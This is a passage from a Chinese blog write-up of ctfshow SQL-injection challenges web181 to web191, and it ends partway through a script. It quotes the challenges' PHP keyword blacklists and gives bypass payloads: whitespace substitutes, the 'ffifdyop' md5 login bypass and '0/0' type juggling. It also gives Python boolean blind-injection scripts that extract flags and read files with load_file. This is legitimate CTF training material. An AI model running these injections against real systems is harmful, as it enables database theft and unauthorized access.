<li><code>\x09</code>：水平制表符（Tab）</li>
<li><code>\x0a</code>：换行符（LF）</li>
<li><code>\x0b</code>：垂直制表符</li>
<li><code>\x0c</code>：换页符</li>
<li><code>\x00</code>：空字符</li>
<li><code>\x0d</code>：回车符（CR）</li>
<li><code>\xa0</code>：不间断空格</li>
</ul>
</li>
<li>
<p><strong><code>\x23|\#</code></strong>：匹配井号（<code>#</code>），在 SQL 中，<code>#</code> 通常用于注释，攻击者可能会利用注释来绕过 SQL 语句的检查。</p>
</li>
<li>
<p><strong><code>file|into|select</code></strong>：匹配关键字 <code>file</code>、<code>into</code> 和 <code>select</code>，这些关键字在 SQL 注入和文件包含攻击中经常被使用。</p>
</li>
</ul></blockquote>
<p><strong>方法一</strong>  用like来匹配关键词flag</p>
<pre tabindex="0"><code>-1&#39;%0cor%0cusername%0clike%0c&#39;flag
</code></pre><p><strong>方法二</strong></p>
<pre tabindex="0"><code>-1&#39;or(id=26)and&#39;1
</code></pre><p>看到一篇大佬的文章，感觉明了不少</p>
<p><a href="https://exp10it.io/2022/07/ctfshow-web-sqli-171-197-writeup/#web178">ctfshow Web入门SQL注入 web171-197 Writeup - X1r0z Blog</a></p>
<p><img alt="image-20250207214719604" loading="lazy" src="./assets/image-20250207214719604.png"></p>
<h4 id="web182">web182<a hidden class="anchor" aria-hidden="true" href="#web182">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1">//对传入的参数进行了过滤
</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"></span>  <span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="k">return</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p><strong>黑名单增加</strong>：flag</p>
<p>这题可以用到like进行模糊查询</p>
<p><img alt="image-20250207211733958" loading="lazy" src="./assets/image-20250207211733958.png"></p>
<p>payload:</p>
<pre tabindex="0"><code>-1&#39;or%0cusername%0clike%0c&#39;fl%
</code></pre><p>或者继续使用上一题的方法二</p>
<h4 id="web183">web183<a hidden class="anchor" aria-hidden="true" href="#web183">#</a></h4>
<p>查询语句</p>
<pre tabindex="0"><code>//拼接sql语句查找指定ID用户
$sql = &#34;select count(pass) from &#34;.$_POST[&#39;tableName&#39;].&#34;;&#34;;  
</code></pre><p>返回逻辑</p>
<pre tabindex="0"><code>//对传入的参数进行了过滤
  function waf($str){
    return preg_match(&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#39;, $str);
  }
</code></pre><p>查询结果</p>
<pre tabindex="0"><code>//返回用户表的记录总数
      $user_count = 0;
</code></pre><p>题目大概的意思就是我们传入表名进行查询，如果表名正确，就会返回用户表记录总数1，如果表名错误则返回0，且每次最多只会返回1，根据这个我们可以尝试布尔盲注，如果我们知道表名(ctfshow_user)和列名(pass)，我们就能通过布尔盲注拿到flag</p>
<p>Y4tacker大佬的脚本</p>
<pre tabindex="0"><code>import requests

url = &#39;http://ee0ad3ab-e8f0-4183-97a8-aa3c5bcbe4f4.challenge.ctf.show/select-waf.php&#39;
str = r&#34;{abcdefghijklmnopqrstuvwsyz-0123456789}&#34;
flag = &#34;&#34;
index = 0
while True:
    for i in str:
        data = {
            &#39;tableName&#39;: f&#34;(ctfshow_user)where(substr(pass,{index},1))regexp(&#39;{i}&#39;)&#34;
        }
        r = requests.post(url, data=data)
        if r.text.find(&#34;$user_count = 1;&#34;) &gt; 0:
            flag += i
            print(flag)
            break
    index += 1
</code></pre><p><img alt="image-20250207225938289" loading="lazy" src="./assets/image-20250207225938289.png"></p>
<p>不是为什么我flag的马甲是这样的</p>
<h4 id="web184">web184<a hidden class="anchor" aria-hidden="true" href="#web184">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1">//对传入的参数进行了过滤
</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"></span>  <span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="k">return</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&#34;|union|\`|sleep|benchmark/i&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p>因为这题where被ban了，我们可以利用right join进行代替</p>
<p>依旧是布尔盲注</p>
<p><img alt="image-20250207231215915" loading="lazy" src="./assets/image-20250207231215915.png"></p>
<p>POC</p>
<pre tabindex="0"><code>import requests

url = &#39;http://effed757-6639-46a9-9103-22fedb04bb41.challenge.ctf.show/select-waf.php&#39;
charset = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}&#39;
flag = &#39;&#39;

for i in range(1, 50):  # 假设 flag 最长 50 个字符
    for j in charset:
        payload = f&#34;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1) regexp char({ord(j)}))&#34;
        data = {
            &#39;tableName&#39;: payload
        }
        response = requests.post(url, data=data)
        if &#34;some_success_condition&#34; in response.text:
            flag += j
            print(flag)
            break
</code></pre><h4 id="web185">web185<a hidden class="anchor" aria-hidden="true" href="#web185">#</a></h4>
<pre tabindex="0"><code>//对传入的参数进行了过滤
  function waf($str){
    return preg_match(&#39;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&#34;|union|\`|sleep|benchmark/i&#39;, $str);
  }
</code></pre><p>这题把数字ban掉了</p>
<p>这其实就导致了我们在构造payload的时候没办法直接使用数字</p>
<p>但是我们可以用true来代替构造出数字</p>
<p>我们知道true = 1</p>
<p>那2就可以用true+true来表示，以此类推</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://33578c7b-f34a-422b-87a5-a8accac68645.challenge.ctf.show/select-waf.php&#34;</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">def</span> <span class="nf">createNum</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="n">num</span> <span class="o">=</span> <span class="s1">&#39;true&#39;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">if</span> <span class="n">n</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="k">return</span> <span class="s1">&#39;true&#39;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">            <span class="n">num</span> <span class="o">+=</span> <span class="s2">&#34;+true&#34;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">return</span> <span class="n">num</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">45</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">5</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">continue</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">127</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="s2">&#34;tableName&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,</span><span class="si">{</span><span class="n">createNum</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">,</span><span class="si">{</span><span class="n">createNum</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="si">}</span><span class="s2">)regexp(char(</span><span class="si">{</span><span class="n">createNum</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="si">}</span><span class="s2">)))&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;$user_count = 43;&#34;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">            <span class="k">if</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="o">!=</span> <span class="s2">&#34;.&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">                <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]result is:&#34;</span><span class="o">+</span><span class="n">flag</span><span class="o">.</span><span class="n">lower</span><span class="p">())</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">                <span class="k">if</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;}&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">                    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">                <span class="k">break</span>
</span></span></code></pre></div><h4 id="web186">web186<a hidden class="anchor" aria-hidden="true" href="#web186">#</a></h4>
<pre tabindex="0"><code>//对传入的参数进行了过滤
  function waf($str){
    return preg_match(&#39;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&#34;|union|\`|sleep|benchmark/i&#39;, $str);
  }
</code></pre><p>解法和上题一样</p>
<h4 id="web187">web187<a hidden class="anchor" aria-hidden="true" href="#web187">#</a></h4>
<pre tabindex="0"><code>返回逻辑
$username = $_POST[&#39;username&#39;];
$password = md5($_POST[&#39;password&#39;],true);

//只有admin可以获得flag
if($username!=&#39;admin&#39;){
   $ret[&#39;msg&#39;]=&#39;用户名不存在&#39;;
   die(json_encode($ret));
}
      
</code></pre><blockquote>
<p><a href="https://blog.csdn.net/qq_58784379/article/details/120504844">password=md5($pass,true)绕过、弱类型、MD5强碰撞_select * from &lsquo;admin&rsquo; where password=md5($pass,tru-CSDN博客</a></p>
<p><img alt="image-20250209180556787" loading="lazy" src="./assets/image-20250209180556787.png"></p>
<p><img alt="image-20250209180634255" loading="lazy" src="./assets/image-20250209180634255.png"></p></blockquote>
<p>payload:</p>
<pre tabindex="0"><code>admin/ffifdyop
</code></pre><p><img alt="image-20250209181202696" loading="lazy" src="./assets/image-20250209181202696.png"></p>
<p>抓个包</p>
<h4 id="web188">web188<a hidden class="anchor" aria-hidden="true" href="#web188">#</a></h4>
<pre tabindex="0"><code>查询语句

  //拼接sql语句查找指定ID用户
  $sql = &#34;select pass from ctfshow_user where username = {$username}&#34;;
</code></pre><pre tabindex="0"><code>返回逻辑


  //用户名检测
  if(preg_match(&#39;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#39;|\&#34;/i&#39;, $username)){
    $ret[&#39;msg&#39;]=&#39;用户名非法&#39;;
    die(json_encode($ret));
  }

  //密码检测
  if(!is_numeric($password)){
    $ret[&#39;msg&#39;]=&#39;密码只能为数字&#39;;
    die(json_encode($ret));
  }

  //密码判断
  if($row[&#39;pass&#39;]==intval($password)){
      $ret[&#39;msg&#39;]=&#39;登陆成功&#39;;
      array_push($ret[&#39;data&#39;], array(&#39;flag&#39;=&gt;$flag));
    }
      
</code></pre><blockquote>
<p><img alt="image-20250209215646783" loading="lazy" src="./assets/image-20250209215646783.png"></p>
<p><a href="https://blog.csdn.net/qq_50589021/article/details/119426002">ctfshow-sql注入-超详解(172-200)_ctfshow 172-CSDN博客</a></p></blockquote>
<p>所以payload为</p>
<pre tabindex="0"><code>0/0
或者
1||1/0
</code></pre><p><a href="https://stackoverflow.com/questions/18883213/why-select-from-table-where-username-0-shows-all-rows-username-column-is-v">https://stackoverflow.com/questions/18883213/why-select-from-table-where-username-0-shows-all-rows-username-column-is-v</a></p>
<h4 id="web189">web189<a hidden class="anchor" aria-hidden="true" href="#web189">#</a></h4>
<pre tabindex="0"><code>  //拼接sql语句查找指定ID用户
  $sql = &#34;select pass from ctfshow_user where username = {$username}&#34;;
</code></pre><pre tabindex="0"><code>
  //用户名检测
  if(preg_match(&#39;/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i&#39;, $username)){
    $ret[&#39;msg&#39;]=&#39;用户名非法&#39;;
    die(json_encode($ret));
  }

  //密码检测
  if(!is_numeric($password)){
    $ret[&#39;msg&#39;]=&#39;密码只能为数字&#39;;
    die(json_encode($ret));
  }

  //密码判断
  if($row[&#39;pass&#39;]==$password){
      $ret[&#39;msg&#39;]=&#39;登陆成功&#39;;
    }
     
</code></pre><p>这题在输入0/0的时候会显示密码错误，而在输入1/0的时候则会显示查询错误</p>
<p>可以通过这个来进行布尔盲注，即正确时系统返回查询错误，错误时系统返回密码错误</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="c1"># @Author  : Yn8rt</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="c1"># @Time    : 2021/7/30 15:48</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"># @Function:</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://98e1809d-5de9-4f68-b45f-d03388b1dae8.challenge.ctf.show/api/&#39;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;ctfshow{&#39;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">letter</span> <span class="o">=</span> <span class="s1">&#39;0123456789abcdefghijklmnopqrstuvwxyz-</span><span class="si">{}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">letter</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">            <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;if(load_file(&#39;/var/www/html/api/index.php&#39;)regexp(&#39;</span><span class="si">{}</span><span class="s2">&#39;),0,1)&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">flag</span> <span class="o">+</span> <span class="n">j</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="c1">#print(r)</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;密码错误&#34;</span> <span class="o">==</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;msg&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="n">flag</span> <span class="o">+=</span> <span class="n">j</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">if</span> <span class="s1">&#39;}&#39;</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span></span></code></pre></div><h4 id="web190">web190<a hidden class="anchor" aria-hidden="true" href="#web190">#</a></h4>
<p>查询语句</p>
<pre tabindex="0"><code>  //拼接sql语句查找指定ID用户
  $sql = &#34;select pass from ctfshow_user where username = &#39;{$username}&#39;&#34;;
      
</code></pre><p>返回逻辑</p>
<pre tabindex="0"><code>  //密码检测
  if(!is_numeric($password)){
    $ret[&#39;msg&#39;]=&#39;密码只能为数字&#39;;
    die(json_encode($ret));
  }

  //密码判断
  if($row[&#39;pass&#39;]==$password){
      $ret[&#39;msg&#39;]=&#39;登陆成功&#39;;
    }

  //TODO:感觉少了个啥，奇怪
      
</code></pre><p><img alt="image-20250209225336696" loading="lazy" src="./assets/image-20250209225336696.png"></p>
<p>所以这题依旧可以进行布尔盲注</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># @Author:Y4tacker</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://eb2e57dd-6c44-4140-9052-f549f647caa9.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="c1"># 查数据库</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># 查字段</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_fl0g&#39;&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># 查flag</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select group_concat(f1ag) from ctfshow_fl0g&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;admin&#39; and if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,1,2)=&#39;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;密码错误&#34;</span>  <span class="o">==</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;msg&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web191">web191<a hidden class="anchor" aria-hidden="true" href="#web191">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//拼接sql语句查找指定ID用户
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select pass from ctfshow_user where username = &#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//密码检测
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;密码只能为数字&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">  <span class="c1">//密码判断
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">      <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;登陆成功&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">  <span class="c1">//TODO:感觉少了个啥，奇怪
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/file|into|ascii/i&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;用户名非法&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p>这题和上题一样，只是加了点ban掉了ascii</p>
<p>我们用ord代替ascii即可</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># @Author:Y4tacker</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://92a52ee7-65ff-4fff-b3d9-ec90f74fd2f5.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
